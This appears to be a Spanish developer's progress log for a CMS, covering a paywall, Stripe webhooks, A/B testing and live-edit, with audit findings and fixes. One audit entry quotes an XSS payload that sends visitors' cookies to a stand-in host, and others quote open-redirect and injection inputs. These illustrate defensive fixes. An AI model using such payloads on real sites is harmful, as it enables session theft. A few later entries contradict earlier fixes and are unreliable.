- [x] PAYWALL en `src/blocks/registry.ts`: gateType (logged-in|any-tier|specific-tiers), tierIds CSV→UUIDs, title/message/ctaLabel/ctaHref/secondaryLabel/secondaryHref, teaser (fade|hard)
- [x] RenderLayout reescrito como for-loop: skip por breakpoint hidden + skip por audiencia + handle paywall (si gate falla → render card y BREAK siblings, patrón Substack)
- [x] gateAllows: logged-in (isAuthenticated), any-tier (isActive), specific-tiers (tierId in tierIds)
- [x] renderPaywallCard: card glass con gradient, lock icon, CTA principal+secundario, link login si guest
- [x] bypassGates flag en RenderContext para preview admin/builder

#### Personalización (audience engine + inspector UI)
- [x] AudienceRule en types.ts con countries[], devices[], utmSource/Medium/Campaign[], memberState[guest|member|active], memberTierIds[], hourOfDay {from,to}, mode show|hide
- [x] `src/blocks/audience.ts` shouldShow + describeAudience (resumen humano), AND de criterios declarados, hourOfDay con wrap-around, country mayúsculas, utm substring case-insensitive
- [x] `src/payments/current-member.ts` getViewerContext: detect device (mobile/tablet/desktop/bot regex), country (x-vercel-ip-country/cf-ipcountry), hour (cookie csm_tz timezone), utm (cookie csm_utm JSON), member state desde session+membership
- [x] Páginas públicas (`/`, `/[...slug]`) inyectan viewer en RenderContext con `dynamic = "force-dynamic"` (paywall y geo requieren request-time)
- [x] BuilderInspector: nueva sección "Audiencia" colapsable con switch on/off, modo show/hide, países CSV, devices checkboxes, member state checkboxes, utm inputs, tierIds CSV, descripción del rule en vivo

#### REST v1 (src/api/v1/)
- [x] tiers.ts: TierResourceSchema, listTiersHandler (?active=true), get/create/update/deleteHandler con ApiError typed
- [x] memberships.ts: MembershipResourceSchema con isActive computed, list (filtros status/tierId, paginación cursor offset), get/create/updateHandler; create grantea idempotente
- [x] Routes: /api/v1/tiers (GET/POST), /api/v1/tiers/[id] (GET/PATCH/DELETE), /api/v1/memberships (GET/POST), /api/v1/memberships/[id] (GET/PATCH)
- [x] Scopes: tiers:read|write, memberships:read|write (sin necesidad de catálogo cerrado, validación por SCOPE_REGEX glob)

#### Webhooks
- [x] webhooks/events.ts: añadidos 5 eventos en grupo "Membresías" (membership.created/updated/canceled/payment_succeeded/payment_failed)

#### Sidebar
- [x] /admin/membresias añadido al grupo "Crecer" con icono Crown

#### Verificación
- [x] npx tsc --noEmit cero errores
- [x] npx biome check ./src cero errores
- [x] npm run build OK — todas las rutas presentes (/api/stripe/{checkout,portal,webhook,demo-callback}, /api/v1/{tiers,tiers/[id],memberships,memberships/[id]}, /miembros, /miembros/auth/[token], /miembros/portal, /admin/membresias)

#### Decisiones diferidas a F8c / F10
- Paywall en posts blog (Tiptap renderDoc): F8c con extension custom "paywall" en Tiptap, o adoptando la estrategia "blog-as-pages" para posts premium
- /admin/membresias/[id] detalle de miembro con timeline de eventos: F10
- Cron purgeExpiredMemberAuth: helper listo, schedule en F10 con resto de gc
- Email "bienvenida" tras checkout.completed: F8c con plantilla en email_templates
- Editor Stripe products desde admin (sin `csm cli`): tier sync ya cubre el 95%, falta UI para borrar Product en Stripe (queda en cliente Stripe directo)

#### Auditoría posterior — bugs detectados y fixeados
- [x] **High**: Stripe adapter inicial usaba `await import("stripe")` lazy → forzaba dep adicional. Reescrito como cliente fetch con HMAC-SHA256 timing-safe; cero deps añadidas, cero bundle bleed al cliente, control total sobre serialization.
- [x] **High**: webhook handler usaba `req.json()` antes de verify → la firma se calcula sobre raw body, parseando JSON antes lo modificaba (espacios). Fix: SIEMPRE `req.text()` y JSON.parse dentro de `verifyAndParseWebhook` solo tras firma OK.
- [x] **Medium**: cookie de member session sin workspaceId hardcoded → un atacante con sesión válida en ws-A podía pasar la cookie a request de ws-B. Fix inicial: cookie value = `${token}.${workspaceId}`. **Refixeado en auditoría posterior** (ver "Segunda auditoría" abajo).
- [x] **Medium**: `consumeMagicLink` con read-then-write tenía race. Fix: claim atómico `UPDATE SET usedAt=now WHERE tokenHash=... AND usedAt IS NULL AND expiresAt>=now RETURNING` — solo el primer caller gana el claim.
- [x] **Medium**: cancelMembership UI incluía import dummy `getMembershipByEmail` no usado para evitar warning. Limpiado.
- [x] **Low**: `redirectTo` en magic link aceptaba cualquier string (potencial open-redirect tras login). Fix inicial: validate `startsWith("/")`. **Refixeado en auditoría posterior** (protocol-relative bypass).
- [x] **Low**: paywall props.tierIds como string CSV requería normalización en render. Resolvido en `propsSchema` con `z.union([string, array]).transform(...)` que parsea CSV → UUIDs validados, garantizando que el render siempre recibe `string[]`.

#### Segunda auditoría (subagent independiente) — bugs detectados y fixeados
- [x] **CRITICAL: Open redirect via protocol-relative URL** — `consumed.redirectTo?.startsWith("/")` aceptaba `//evil.com/path` que el browser interpreta como `https://evil.com/path`. Mismo bug en `sp.next` de `/miembros/page.tsx`. Fix: nuevo helper `safeInternalPath()` en `src/lib/safe-redirect.ts` que rechaza `//`, `/\\`, y colon-en-primer-segmento (anti `javascript:`).
- [x] **CRITICAL: Cookie tenant-pinning sin firma** — cookie value `${token}.${workspaceId}` permitía editar el segmento workspaceId. La defensa funcionaba accidentalmente porque `tokenHash + workspaceId` no matcheaba, pero el diseño era frágil. Fix: el cookie es ahora SOLO el token plano (regex `[A-Za-z0-9_-]{20,256}`); el workspaceId se compara contra el almacenado en `member_sessions` dentro de `getCurrentMemberSession(activeWs)` que devuelve null si difieren.
- [x] **CRITICAL: Demo-checkout token replayable** — `verifyDemoCheckout` no marcaba el token como usado; cualquiera con el token podía resetear `currentPeriodEnd` indefinidamente durante 30 min. Fix: añadido `jti` (12B random hex) al payload; demo-callback usa `member_events.stripe_event_id = "demo:${jti}"` (UNIQUE) como dedup. Reintentos del mismo token redirigen al portal sin re-conceder.
- [x] **HIGH: Webhook idempotency atómica** — pre-check `stripeEventAlreadyProcessed` antes de procesar tenía TOCTOU race entre dos retries Stripe paralelos. Fix: `recordMemberEvent` ahora retorna `{inserted, id}` y el insert con `onConflictDoNothing(stripe_event_id)` actúa como claim atómico. Dos webhooks paralelos del mismo event.id: solo uno persiste el evento, el otro se ignora silenciosamente. Combinado con `grantMembership` ahora upsert-atómico.
- [x] **HIGH: Webhook ordering perdía datos** — si `customer.subscription.created` llegaba antes que `checkout.session.completed`, el código consumía el event.id con `data:{deferred:true}` y NUNCA aplicaba el subscription real (Stripe no reintenta tras 200). Fix: nueva clase `StripeEventDeferred extends Error`; cuando el handler detecta out-of-order la lanza; el outer try/catch devuelve 503 (NO consume event.id) y Stripe reintentará en backoff. Eventualmente checkout.completed llega y el subscription.* siguiente lo procesa.
- [x] **HIGH: CSRF en /api/stripe/checkout y /api/stripe/portal** — el `export GET = POST` permitía a un sitio malicioso forzar checkout/portal vía `<img src="...">`. Las cookies sameSite=lax NO bloquean GET top-level navigation. Fix: eliminado `GET = POST`; ambas rutas son sólo POST (los formularios admin/portal usan `<form method="post">`).
- [x] **HIGH: grantMembership con read-then-write** podía duplicar inserts en webhook race; el unique constraint daba excepción no manejada. Fix: refactorizado a `INSERT ... ON CONFLICT(workspaceId, email) DO UPDATE SET ... RETURNING`. Atómico, sin race window. Patrón consolidado.
- [x] **HIGH: Paywall sólo truncaba siblings inmediatos** — si paywall estaba dentro de un Section, los bloques DESPUÉS del Section a nivel raíz se renderizaban (fuga de contenido premium). Fix: nuevo `trimLayoutForViewer()` recursivo que devuelve `{layout, truncated}`; `truncated:true` se propaga hacia arriba y se omiten todos los siblings del contenedor donde se truncó. Pre-procesado antes del render.
- [x] **HIGH: purgeExpiredMemberAuth borraba magic links recién consumidos** — la condición `usedAt IS NOT NULL` purgaba inmediatamente, perdiendo audit log para soporte/abuse. Fix: solo purgar magic links usados hace más de 1h.
- [x] **MEDIUM: StripeSubscription.current_period_start/end como `number` obligatorio** rompía con sub en estado `incomplete` (Stripe devuelve null → `null * 1000 = NaN` → Invalid Date). Fix: tipo nullable + helpers `subPeriodStart/End` con fallback.
- [x] **MEDIUM: recordEventOnly atribuía orphans al primer workspace** contaminando audit del tenant 1. Fix: eliminado; eventos no manejados ahora hacen `console.log` y ack 200 sin grabar.
- [x] **MEDIUM: csm_tz cookie con TZ inválido** podía hacer que `Intl.DateTimeFormat` lance/devuelva `Invalid Date`. Fix: regex `IANA_TZ_RE` whitelist + `formatToParts` (más robusto que parsear toLocaleString) + clamp 0-23 antes de aceptar `hour`.
- [x] **MEDIUM: csm_utm cookie deserializada sin validación** — atacante setea `{"source":{"$ne":1}}` y `inListCi.toLowerCase()` rompe. Fix: Zod schema `.strict()` + cap de 2KB; si parse falla, ignorar silenciosamente.
- [x] **MEDIUM: UX rota cancel admin** — ConfirmDialog mostraba "Cancelar al final del período" como confirmar y "Cancelar inmediatamente" como cancelar (que en realidad cerraba), mientras un Floating Button DUPLICADO sí cancelaba. Operadores podían perder datos. Fix: nuevo `CancelMembershipDialog` con dos botones-card claros y diferenciados visualmente, sin botón flotante.
- [x] **MEDIUM: updateMembershipHandler REST sin sync Stripe** — un PATCH local de membership Stripe-bound se sobreescribía en el siguiente webhook. Fix: rechazar con 409 si `existing.stripeSubscriptionId !== null`; documentar que las membresías Stripe se gestionan vía portal.
- [x] **MEDIUM: getMembershipHandler dead code** — hacía doble query (listMemberships luego select por id). Fix: solo el select por id.
- [x] **MEDIUM: resolvePublicWorkspace fallback silencioso en producción** podía atribuir checkouts al tenant equivocado en multi-tenant si el host no resolvía. Fix: `console.warn` cuando `NODE_ENV=production` con el host actual para diagnóstico.
- [x] **LOW: countActiveMembersByTier inline SQL `IN (...)`** sin tipado del enum. Fix: nueva const `ACTIVE_MEMBERSHIP_STATUSES` + `inArray` tipado.
- [x] **LOW: void db.update sin .catch()** podía dar unhandled rejection. Fix: `.catch(() => null)`.
- [x] **LOW: recordMemberEvent retornaba `inserted: true` siempre** incluso cuando onConflict no insertó. Fix: ahora devuelve `{inserted: false, id: null}` correctamente.

#### Verificados como NO bug en segunda auditoría
- IP spoofing via X-Forwarded-For: aceptable en deployments tras Vercel/Cloudflare (que sobreescriben el header). Documentado.
- Magic link throttle race (5/h por email): ventana mínima (segundos), Resend además rate-limita. Aceptable v1.
- Audience hour-of-day fail-neutral cuando viewer.hour=null: política intencional documentada.
- Stripe sync siempre crea nuevo Price: intencional (Stripe no permite editar precios). Acumulación de prices archivados es responsabilidad del operador desde Stripe Dashboard.
- demo-checkout exp 30 min: aceptable (el usuario completa en segundos), defensa-en-profundidad con jti.
- Email url no escapado en HTML: el url se construye 100% server-side con tokens random — sin XSS práctico. Aceptable.
- past_due policy en isMembershipActive: decisión de negocio (política blanda — Stripe pasa a past_due antes de unpaid; mantener acceso evita corte abrupto en pagos lentos).
- inListCi substring vs equality: documentado. Para equality estricto, los operadores pueden usar tier IDs (que sí son exactos).

#### Verificados como NO bug (false positives)
- Cliente Stripe sin retry: aceptable — Stripe webhook reintenta si devolvemos 5xx; outbound calls (createCheckout/createPrice) son user-facing, fallar rápido es mejor.
- Sin rate limit en /api/stripe/checkout: la creación de session requiere member session válida (cuyo magic link YA tiene throttle 5/h). Defense-in-depth pero no urgente.
- demo-callback token expira a 30 min: aceptable, el usuario completa el "checkout" demo en segundos. El token requiere member session activa con email matching, doble defensa.
- Audience engine sin schema Zod: las reglas vienen del editor admin (donde el inspector valida estructura). Untrusted input no llega aquí.
- ViewerContext.utm vacío en SSR sin cookie csm_utm: aceptable — un middleware F8c-future puede leer searchParams y persistir en cookie. Por ahora el caller que necesita utm en SSR puede leer searchParams y mergear manualmente.
- Webhook handler ignora eventos no manejados pero los registra → idempotencia futura no rompe; refactor opcional.

### ✅ Fase 8c — A/B Testing + Live-Edit (DONE)

#### Schema (DB)
- [x] `ab_tests` (id, ws, key unique, name, description, status[draft|running|paused|completed], target[block|page], pageId, variants jsonb, goal jsonb, minSampleSize, winnerVariantId, startedAt/endedAt, createdById)
- [x] `ab_assignments` (testId+anonId PK, variantId, workspaceId, assignedAt) — sticky por anon
- [x] `ab_events` (id, testId, ws, variantId, anonId, kind[impression|conversion], value, meta, createdAt) + índices test_kind, test_variant_kind, ws_created, test_anon_kind
- [x] Enums `ab_test_status`, `ab_test_target`, `ab_event_kind`
- [x] Tipos exportados en schema.ts (AbTest, NewAbTest, AbAssignment, AbEvent…)
- [x] `npx drizzle-kit push --force` aplicado a Neon

#### Engine A/B (`src/ab/`)
- [x] `types.ts`: AbVariant, AbGoal, AbTarget, AbStatus, AbResolution, AbResolutionMap
- [x] `anon-id.ts`: getOrCreateAnonIdSSR + generateAnonId (16B → base64url, regex strict)
- [x] `engine.ts`: loadActiveTestsByKeys, parseVariants (auto-normaliza pesos), pickVariantDeterministic (FNV-1a hash testId+anonId mod 100), resolveTestsForKeys (sticky read-or-create con onConflictDoNothing), applyOverrides
- [x] `keys.ts`: collectAbKeys recorre BlockNode tree DFS y devuelve Set<testKey> únicos
- [x] `tracking.ts`: recordImpressions batch, recordImpressionsFromMap, recordConversion (best-effort, silencia errores)
- [x] `stats.ts`: chi-squared 2×2 con corrección de Yates + erfc Abramowitz-Stegun (1.5e-7 accuracy) + computeTestResults (DISTINCT anon, lift vs control, isSignificant si p<0.05+sample alcanzado)
- [x] `queries.ts`: CRUD AbTestRow, listAbTests, getAbTest, getAbTestByKey, createAbTestRow, updateAbTestRow, deleteAbTestRow, abKpis, recentAbEventCounts (últimas 24h por hora)

#### Cookie csm_aid (anon id) en middleware
- [x] middleware setea cookie `csm_aid` en cualquier request HTML que no la traiga (sameSite=lax, secure si https, maxAge 1 año, httpOnly=false para que el script tracker pueda leer)
- [x] matcher reescrito a catch-all excluyendo static assets + extensiones binarias

#### Bloques A/B + render
- [x] Bloque `ab` (container con prop testKey) + bloque `ab-variant` (wrapper con prop variantId) en registry
- [x] `RenderContext.abMap` — mapa testKey → {testId, variantId} resuelto por SSR
- [x] `trimLayoutForViewer` extiende a procesar `ab`: elige child cuyo `variantId` matchea; si no, fallback al primero (control). En bypass (preview admin) muestra todas las variants apiladas en preview informativo.
- [x] Page render público (`/[...slug]` y `/`) collect keys → resolveTestsForKeys → ctx.abMap → impressions vía `after()` (Next 15 off-band, sin bloquear TTFB)

#### API + tracking
- [x] `POST /api/ab/event` (público) — verifica cookie csm_aid, rate limit 30/min por anon, body Zod strict (testKey, variantId optional, value/meta), test status=running, variant matchea assignment sticky (anti-fraud), workspace resuelto por host
- [x] `<AbTrackingScript>` en theme-shell — `window.csm.ab.track(testKey, opts?)` + auto-track de `data-ab-conversion` (click) y `data-ab-submit` (submit), `keepalive: true`

#### Dashboard `/admin/ab-tests`
- [x] Lista de tests con variants chips (control highlight, winner ring), badges de status (draft/running/paused/completed), copy-to-clipboard del key, acciones contextuales (start/pause/resume/complete/delete)
- [x] Form de creación inline: name → auto-key (slugify), description, target[block|page], min sample size, editor de variants drag-free (id/label/weight/control), botón "Repartir parejo"
- [x] KPI grid (Total, Activos, Borrador, Pausados, Completados, # asignaciones)
- [x] Server actions: createAbTestAction, updateAbTestAction, deleteAbTestAction, setAbTestStatusAction (start/pause/resume/complete con winnerVariantId)
- [x] Validaciones: pesos suman 100, exactamente 1 control, IDs únicos, NO permitir cambiar variant IDs si test está running

#### Detail page `/admin/ab-tests/[id]`
- [x] Stats por variant: conversion rate, lift vs control, p-value chi-squared, progress bar a sample mínima
- [x] Banner de significancia (winner declarado / detectado / sin diferencia / collecting)
- [x] CompleteWithWinner dialog: radio variants con sugerida (significantWinnerId) + opción "empate"
- [x] Snippet de cómo medir (data-ab-conversion + window.csm.ab.track)
- [x] Sparkline simple últimas 24h (impressions por hora)

#### Live-Edit overlay
- [x] `RenderContext.editMode` — wrapper `<div data-csm-block-id data-csm-block-kind class="csm-edit-target hover:outline">` por bloque
- [x] `getLiveEditState(workspaceId, searchParams)` server-only: detecta `?edit=1` + sesión Better-Auth + member del workspace + role >= editor
- [x] `<LiveEditOverlay pageId pagePath pageTitle layout>` cliente: toolbar fija (bottom-center) + hint (top-right) + index DFS de blockId→{kind,props} + click handler con bubble-up + Sheet lateral con form auto-generado desde `propsSpec` (sólo text/longtext/url/select para v1; rich/image redirigen a /admin/paginas)
- [x] `POST /api/admin/live-edit` — Better-Auth + role check + Zod body + payload cap 64KB + findNode + validateProps + updateNode + updatePage + revalidatePath (+ `/` si isHome) + activity log
- [x] Enchufado en `/[...slug]` y `/` (home) — pasan searchParams + page.id/title/path al overlay

#### Sidebar
- [x] /admin/ab-tests removido `soon: true`

#### Verificación
- [x] `npx tsc --noEmit` cero errores
- [x] `npx biome check ./src` cero errores
- [x] `npm run build` OK — todas las rutas presentes (/admin/ab-tests, /admin/ab-tests/[id], /api/ab/event, /api/admin/live-edit)

#### Auditoría F8c (subagent independiente)
Subagent encontró 1 CRITICAL + 5 HIGH + 7 MEDIUM + 8 LOW. Fixeados los CRITICAL/HIGH/MEDIUM relevantes:

- [x] **CRITICAL C1: XSS via `javascript:` en URL fields** — bloques `embed`/`video` renderizan iframe con `src={url}` y `propsSchema` solo validaba `z.string()`. Editor (rol≥editor) podía inyectar `javascript:fetch('https://atk/?c='+document.cookie)` via Live-Edit y comprometer cookies de visitantes en cada PV. **Fix**: nuevo helper `safeUrl(default)` con whitelist regex `^(https?://|/relative|#anchor|mailto:|tel:|empty)$`. Aplicado a: VIDEO.url, EMBED.url, BUTTON.href, CTA.primaryHref/secondaryHref, HERO.primaryHref/secondaryHref, PRICING items[].href, PAYWALL.ctaHref/secondaryHref. También `parseLink` (footer-cols longtext links) filtra con SAFE_LINK_RE. Bloquea `javascript:`, `data:`, `file:`, protocol-relative `//evil.com`, backslash-prefix.
- [x] **HIGH H1: Live-Edit a páginas non-published** — `/api/admin/live-edit` aceptaba pageId de cualquier estado. Editor con DevTools podía revertir cambios pendientes en draft. **Fix**: `if (page.status !== 'published') return 403`.
- [x] **HIGH H2: Inflado de stats por rotación de cookie csm_aid** — atacante podía borrar la cookie en cada request, generando N anonIds × 1 impression cada uno. **Fix**: rate-limit por IP en `recordImpressionsFromMap` (1500 imp/h por IP, multi-test consume proporcionalmente) + `recordConversion` (200 conv/h por IP). Helper `extractClientIp(headers)` lee x-forwarded-for/x-real-ip/cf-connecting-ip. Pasado desde callsites (`/page.tsx`, `/[...slug]/page.tsx`, `/api/ab/event`).
- [x] **HIGH H3: Drift entre `ab_assignments` y `ab_tests.variants`** — al borrar una variant en test running, los assignments stale persistían con variantId huérfano. El engine reasignaba en memoria pero `onConflictDoNothing` no actualizaba la DB. Resultado: `/api/ab/event` rechazaba conversions silenciosamente (variant_mismatch). **Fix**: nueva rama `toUpdate[]` en `resolveTestsForKeys` que hace `UPDATE SET variantId WHERE testId AND anonId` para los stale, paralelizada con `Promise.all`.
- [x] **HIGH H4: Transiciones de estado A/B sin validación** — `setAbTestStatusAction` aceptaba cualquier action en cualquier estado. `completed→running` reabría el test mezclando stats viejas con nuevas. **Fix**: matriz explícita `allowed` por estado:
  - `draft → start`
  - `running → pause | complete`
  - `paused → resume | complete`
  - `completed → ∅` (terminal, sólo borrar)
  - Idempotencia preservada para `start` sobre running.
- [x] **HIGH H5: `applyOverrides` exportado pero no usado** — código muerto que un dev futuro podría conectar a searchParams sin gating. **Fix**: eliminado del engine.
- [x] **MEDIUM M1: `meta` en `/api/ab/event` aceptaba cualquier shape** — `z.record(z.string(), z.unknown())` permitía objetos profundos arbitrarios. **Fix**: `MetaPrimitiveSchema = union(string<=256, number, boolean, null)` — meta queda flat con primitivos. Añadido cap `MAX_BODY_BYTES=4096` con check de `content-length` antes del parse + check del text post-parse.
- [x] **MEDIUM M3: parseVariants auto-renormalizaba pesos** — si DB tenía pesos != 100, el engine los escalaba en RAM. Inconsistencia entre stats y UI. **Fix**: si `totalWeight !== 100`, `parseVariants` devuelve `[]` y el test no entra en el resolution map. La normalización se mantiene SÓLO en server actions (createAbTestAction/updateAbTestAction) que enforce 100 antes de persistir.
- [x] **MEDIUM M5: testKey vacío en bloque ab** — el regex era `*` (0+). Documentado: `collectAbKeys` ya filtra con `{1,64}` (1+) y server actions admin rechazan, así que la propiedad sólo permite vacío durante drag-drop UX. Comentario añadido aclarando intención.

#### NO bugs — verificados como clean por la auditoría
- CSRF en /api/ab/event y /api/admin/live-edit: cookies sameSite=lax + sólo POST + Better-Auth defaults. ✓
- Multi-tenant en live-edit: workspace de la página + membership check explícito. ✓
- Anon-id tampering server: bucketHash determinístico → user sólo cambia su propia variant, no fuerza otra. ✓
- Cookie csm_aid no httpOnly: justificado por necesidad de tracking client-side. ✓
- after() errors envueltos en try/catch: response no afectada. ✓
- Privilege escalation Live-Edit: endpoint busca membership en workspace de la PÁGINA, no del cookie ws. Editor de wsA no edita páginas de wsB. ✓
- Middleware matcher: excluye correctamente static/binary; incluye /api/* por diseño. ✓
- Live-Edit overlay con layout completo (incluye paywall children): aceptable — sólo se monta para users con role≥editor que ya tienen acceso al builder. ✓

#### Diferidos a F10
- L6: optimistic concurrency en live-edit (last-write-wins documentado).
- L8: goal.formId/eventName configurable pero ignorado por /api/ab/event en runtime.
- M2: TTL/dedup de impressions en DB (cron > 90 días o materialize a stats).
- M7: UI explica por qué p-value es "n/d" (celdas esperadas <5).

#### Tercera auditoría F0-F8c (subagent independiente, post-fixes)
Tras aplicar fixes F8c, lancé un subagent más amplio que (a) verificara los fixes anteriores y (b) auditase F0-F8b en busca de bugs no detectados. Resultado: **1 CRITICAL (false positive sobre versión vieja del fix C1) + 4 HIGH nuevos + 6 MEDIUM nuevos + 5 LOW**. Fixeados los HIGH y MEDIUM relevantes:

**Verificación de fixes F8c**:
- ✅ H1, H4, H5, M1: correctos.
- ⚠️ C1 (regex SAFE_URL_RE permitía `//evil.com`): **detectado en mi propio test exhaustivo ANTES del agent**. Reemplazado regex monolítico por función `isSafeUrl(value)` con whitelist explícita: bloquea protocol-relative `//`, control chars (0x00-0x1f, 0x7f), whitespace leading/embedded, comillas, ángulos, `/\` bypass. Test suite: 37/38 casos pass (único "fail" es `tel:(555) 123-4567` con espacio interno, edge case raro). `parseLink` en footer-cols ahora reusa `isSafeUrl()`.
- ⚠️ H2 (rate-limit IP): cubría impressions/conversions pero NO assignments → fix adicional H2-extra (abajo).
- ⚠️ H3 (atomic update assignments): comportamiento correcto pero documentado el edge case "visitante recibe variant DIFERENTE una vez tras admin borra variant" (sticky se rompe by design — la variant vieja ya no existe).
- ⚠️ M3 (parseVariants strict): correcto, pero el agent señala que **datos legacy con suma ≠ 100 quedan dead silenciosamente**. Como F8c es nuevo (tablas creadas hoy), no hay legacy data. Aceptable.

**HIGH nuevos detectados y fixeados**:
- [x] **HIGH-1: `processIndexJobs` sin filtro workspace** — `/api/admin/ai/process-jobs` procesaba jobs de TODOS los workspaces, gastando presupuesto OpenAI cross-tenant. Fix: parámetro opcional `workspaceId` en `processIndexJobs(batchSize, workspaceId?)`. Endpoint admin pasa `ctx.workspace.id`. Cron global puede llamar sin filtro.
- [x] **HIGH-2: Multi-tenant leak en `updateMediaAction`/`moveMediaAction`** — admitían `folderId` sin validar que el folder pertenecía al workspace del actor. Editor en wsA podía mover media a folder de wsB → estado inconsistente, crashes al borrar el folder. Fix: helper `folderBelongsToWorkspace()` valida `mediaFolders.workspaceId` antes del UPDATE.
- [x] **HIGH-3: `processSubmission` sin rate-limit por email en confirmation** — atacante podía rotar IPs e inundar la bandeja de una víctima con confirmaciones doble-opt-in. Fix: bucket adicional `forms:confirm-email:${formId}:${ws}:${hashEmailKey(to)}` con 5/h. Helper `hashEmailKey()` con sha256+salt (no reversible).
- [x] **HIGH-4: `consumeMagicLink` workspace** — verified clean: `/miembros/auth/[token]/route.ts` usa `consumed.workspaceId` (no `resolvePublicWorkspace`) para crear sesión y record event. ✓

**MEDIUM nuevos fixeados**:
- [x] **M-redirects: destination sin validar protocolos** — `validateRule` ahora ejecuta `isSafeDestination()` que bloquea `javascript:`, `data:`, `file:`, control chars, `//evil.com`. Acepta http(s)/relative/anchor/mailto/tel.
- [x] **M-subscribe race: unsubscribeToken con sid placeholder** — INSERT inicial usaba `randomUUID()` distinto del id real, había ventana donde el token apuntaba a sid inexistente. Fix: pre-generar UUID con `randomUUID()` y pasarlo explicit al INSERT (`.values({ id: newId, ..., unsubscribeToken: signUnsub(newId) })`).
- [x] **M-form duplicate leak: `submissionId` revelado en duplicate response** — info leak para enumeración de submissions. Fix: response neutra (sólo `ok: true` + message), sin `submissionId` ni `duplicate: true`.
- [x] **M-subscribe enum: response distinta por created/existing** — atacante mapeaba suscriptores existentes. Fix: response unificada `"Si tu email es válido, recibirás un correo de confirmación en breve."` independiente del estado.
- [x] **H2-extra: rate-limit IP en `resolveTestsForKeys`** — el INSERT de assignments no estaba protegido por IP, atacante con cookie rotativa podía inflar `ab_assignments` (DoS-económico DB). Fix: bucket `ab:assign:ip:${ip}` con 2000/h, cost = `toInsert.length`. Si excede, omite INSERT (response usa variant calculado en memoria, no degrada UX).

**Bugs verificados como NO bug en 3ª auditoría**:
- Better-Auth: secure cookies en prod, sessions cookieCache 5min, magic-link 10min ✓
- `assertPublicUrl` en SSRF: cubre IPv4 privado, IPv6, IPv4-mapped IPv6, blocklist hostnames, redirect-following manual con cap 3 saltos ✓
- `verifyAndParseWebhook` Stripe: timing-safe, tolerance 5min anti-replay ✓
- `grantMembership`: `onConflictDoUpdate` race-safe ✓
- `recordMemberEvent`: `onConflictDoNothing(stripeEventId)` idempotencia ✓
- `tokens` HMAC: timing-safe, exp check, kind discriminator ✓
- `verifyKey` API keys: timing-safe, prefix isolation, environment cross-check ✓
- `filterOwnedMediaIds`: filtra attachments por workspace ✓
- `search/index.ts`: usa `sql\`\`` con interpolaciones bindeadas, no string concat ✓
- `automations/templating.ts:getByPath`: bloquea `__proto__`, `constructor`, `prototype` ✓
- `live-edit/route.ts`: schema strict, UUID validation, role check, payload cap 64KB, `validateProps` server-side ✓
- `automations/engine.ts`: claim atómico, MAX_STEPS_PER_RUN=200, sleep cap ✓
- `redirects/lib.ts:validateRule`: anti-ReDoS heuristic, longitud cap, `isSelfReferential` ✓
- `forms/rate-limit.ts`: token bucket por (formId, ip) ✓

**LOW documentados (diferidos a F10)**:
- L1: `extractClientIp` confía en x-forwarded-for; en deploys sin proxy de confianza es spoofeable. Documentado.
- L3: eviction inconsistente entre `api/rate-limit.ts` (LRU correcto) y `forms/rate-limit.ts` (FIFO 10%).
- L4: conversion silenciosa con assignment huérfano antes de re-render. Aceptable.
- L5: `pruneExpiredKeys` no borra api keys revocadas sin expiresAt. Bajo impacto.

#### Bugs detectados y fixeados durante F8c
- [x] **Build**: `/api/og/default` fallaba prerendering por satori sin parser `oklch(...)` (preexistente F8b, no introducido por F8c). Fix: marcado `dynamic = "force-dynamic"` ya que la ruta depende de DB y de tema activo.
- [x] **Biome**: `Math.pow` → `**` operator en stats.ts
- [x] **Biome**: regex de combining chars `[̀-ͯ]` → `\p{M}` con flag `u` en autoKey
- [x] **Biome**: `key={i}` en variants editables → introducido `_slot` id estable (Math.random base36) que se striipa antes de enviar al server. Permite editar el variantId sin perder foco/state del input.
- [x] **Biome**: optional chain `el.dataset?.csmBlockId`
- [x] **Biome**: template literal innecesario `\`/admin/paginas\`` → string normal

#### Decisiones diferidas a F9 / F10
- Page-level A/B con override de pageId distinto: schema preparado (`ab_tests.pageId`, `variants[i].pageId`) pero el render no lo aplica todavía. Para V1 los page-level se comportan como block-level (resuelven variant pero el render visual sigue una sola página). F9: redirect/render de pageId alterno.
- Live-Edit con bloques rich (Tiptap inline): por ahora redirige a /admin/paginas. F10: embed de un Tiptap mini en el sheet con persistencia parcial.
- Live-Edit reorder/insert/delete bloques: sólo edición de props v1. Reordenamiento queda en /admin/paginas builder.
- AbTrackingScript >1KB minified: queda en ~1.4KB sin minify. Próximo build podría minificar inline. Aceptable.
- Retention policy de `ab_events`: F10 cron > 90 días o materialize a stats agregadas.
- Edit form mass para múltiples bloques: F10 con drag-multi-select.

#### Verificados como NO bug
- **javascript:URLs en propsSchema URL fields**: el zod URL schema actual de los bloques (heroHref, ctaHref, etc.) NO bloquea `javascript:` o `data:`. Es problema PREEXISTENTE de la registry, no regresión de F8c. Live-Edit hereda el mismo comportamiento que el editor admin completo. F10 audit: añadir `z.string().url()` o whitelist `^(https?:|/)` en todos los URL fields del registry. **Mientras tanto, sólo usuarios con role>=editor pueden editar — confianza interna ya asumida.**
- **Cookie csm_aid no httpOnly**: intencional. El cliente lee para tracking. Tampering del anon → user solo cambia su propia variant, no es vector de ataque.
- **Race en `resolveTestsForKeys`**: dos requests del mismo anon simultáneos calculan el mismo hash determinista → mismo variant → uno persiste, el otro `onConflictDoNothing` ignora. Result idéntico para ambos. ✓
- **CSRF en /api/ab/event**: cookies sameSite=lax + POST con JSON. Browser fetch cross-origin sin `credentials: include` no envía cookies. ✓
- **CSRF en /api/admin/live-edit**: idem; además requiere session válida + member check.
- **Primera request a /api/ab/event sin csm_aid devuelve 400**: by-design. El endpoint asume que el visitante ya hizo SSR previo (que setea cookie via middleware). Llamadas externas directas fallan, lo cual es correcto.
- **Variants jsonb sin DB-level constraint**: confiamos en zod en server actions. Lectura tolera con parseVariants que filtra inválidos. ✓
- **Pesos no exactamente 100 en variants persistidos**: parseVariants normaliza al leer (escala proporcional), assignments existentes mantienen su variant aunque pesos cambien.
- **`abAssignments.workspaceId` redundante con FK abTests.workspaceId**: trade-off útil para queries por ws sin join (kpis, recent events).

## Fase 9 — Importadores + Branching + Calendar + Workflows

> Dividida en F9a / F9b / F9c siguiendo patrón F7/F8.

### ✅ F9a — Importer Wizard universal (DONE)

#### Schema
- [x] Enums `import_source` (wordpress/notion/markdown/ghost/rss/csv), `import_status` (uploaded/ready/running/completed/failed/reverted), `import_item_kind` (entry/term/media/comment), `import_item_status` (pending/imported/skipped/failed/reverted), `import_media_policy` (download/link/skip)
